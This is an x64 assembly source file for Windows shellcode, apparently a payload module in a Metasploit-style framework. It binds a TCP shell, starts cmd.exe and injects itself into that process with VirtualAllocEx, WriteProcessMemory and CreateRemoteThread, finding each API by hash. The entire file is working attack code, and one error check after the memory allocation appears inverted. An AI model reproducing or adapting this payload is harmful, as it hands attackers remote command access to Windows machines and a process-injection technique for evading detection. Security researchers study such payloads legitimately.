;-----------------------------------------------------------------------------;
; Author: floomby (floomby@nmt.edu)
; Compatible: windows 8
; Size:
; Build: >build.py single_shell_bind_tcp
;-----------------------------------------------------------------------------;

[BITS 64]
[ORG 0]

default rel                 ; use rip realative addressing

payload:
  cld
  and rsp, 0xFFFFFFFFFFFFFFF0
  call start
%include "./src/block/block_api.asm"
start:
  pop rbp

jump:
  jmp inject

%include "./src/block/block_bind_tcp.asm"

  mov rdx, rdi
  mov rcx, -10
  mov r10d, 0x53CABBD8      ; hash( "kernel32.dll", "SetStdHandle" )
  call rbp

  mov rdx, rdi
  mov rcx, -11
  mov r10d, 0x53CABBD8      ; hash( "kernel32.dll", "SetStdHandle" )
  call rbp

  mov rdx, rdi
  mov rcx, -12
  mov r10d, 0x53CABBD8      ; hash( "kernel32.dll", "SetStdHandle" )
  call rbp

  xor rcx, rcx
  mov r10d, 0x0A2A1DE0      ; hash( "kernel32.dll", "ExitThread" )
  call rbp

inject:

  ;; we need to nop the jump we used before we inject
  lea rax, [jump]
  mov [rax], BYTE 0x90
  inc rax
  mov [rax], DWORD 0x90909090

shell:
  mov r8, 'cmd'
  push r8
  push r8
  mov rdx, rsp

  xor r8, r8
  push byte 18
  pop rcx

push_loop:
  push r8
  loop push_loop

  mov word [rsp+84], 0x0000
  lea rax, [rsp+24]
  mov byte [rax], 104
  mov rsi, rsp

  push rsi
  push rax
  push r8
  push r8
  push r8
  ;inc r8
  push r8
  ;dec r8
  mov r9, r8
  mov rcx, r8
  mov r10d, 0x863FCC79      ; hash( "kernel32.dll", "CreateProcess" )
  call rbp

  xor rax, rax
  mov eax, DWORD [rsi]
  mov r12, rax              ; save the process handle

  mov rcx, rax              ; process handle
  xor rdx, rdx              ; addr
  mov r8, 0x1000            ; size
  mov r9, 0x3000            ; ( MEM_COMMIT | MEM_RESERVE )
  mov rax, 0x40
  push rax
  mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
  call rbp

  test rax, rax
  jnz error

  mov r13, rax              ; save the remote address

  xor rdx, rdx
  push rdx                  ; *bytes writen
  mov rcx, r12              ; process handle
  mov rdx, rax              ; remote addr
  lea r8, [payload]         ; buf
  mov r9, inject - payload  ; size
  mov r10d, 0xE7BDD8C5      ; hash( "kernel32.dll", "WriteProcessMemory" )
  call rbp

  test rax, rax
  jz error

  mov rcx, r12              ; process handle
  xor rdx, rdx              ; *thread attributes
  xor r8, r8                ; stack size
  mov r9, r13               ; start address
  push rdx                  ; *param
  push rdx                  ; creation flags
  push rdx                  ; *thread id
  mov r10d, 0x799AACC6      ; hash( "kernel32.dll", "CreateRemoteThread" )
  call rbp

  test rax, rax
  jz error

  mov rcx, r12              ; process handle
  mov r10d, 0x528796C6      ; hash( "kernel32.dll", "CloseHandle" )
  call rbp

  jmp done

error:

  mov rcx, 0x40
  mov r10d, 0xF4CE7E85
  call rbp

done:
%include "./src/block/block_exitfunk.asm"
